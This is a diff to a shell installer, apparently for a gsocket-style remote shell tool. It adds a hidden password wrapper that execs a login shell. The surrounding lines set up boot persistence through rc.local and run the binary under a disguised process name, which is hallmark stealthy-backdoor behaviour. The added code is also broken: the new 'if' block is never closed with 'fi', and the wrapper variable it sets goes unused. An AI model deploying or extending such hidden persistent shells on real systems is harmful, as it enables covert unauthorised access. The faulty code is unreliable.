@@ -750,6 +750,25 @@ init_setup()
 	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
 	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")
 
+	# GS_PASSWORD: install auth wrapper for 2nd factor (on top of token)
+	GS_AUTH_EXTRA=""
+	if [[ -n $GS_PASSWORD ]]; then
+		AUTH_SCRIPT="$(dirname "${DSTBIN}")/.gs-auth"
+		PASS_HASH=$(echo -n "${GS_PASSWORD}" | sha256sum | cut -d' ' -f1)
+		cat >"${AUTH_SCRIPT}" <<AUTHEOF
+#!/bin/bash
+printf "Password: "
+stty -echo 2>/dev/null
+IFS= read -r _P
+stty echo 2>/dev/null
+printf "\n"
+_H=\$(echo -n "\$_P" | sha256sum | cut -d' ' -f1)
+unset _P
+if [ "\$_H" = "${PASS_HASH}" ]; then exec bash --login; else sleep 2; exit 1; fi
+AUTHEOF
+		chmod 700 "${AUTH_SCRIPT}"
+		GS_AUTH_EXTRA=" -e '${AUTH_SCRIPT}'"
+
 	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
 
 	# There is no reliable way to check if a process is running:
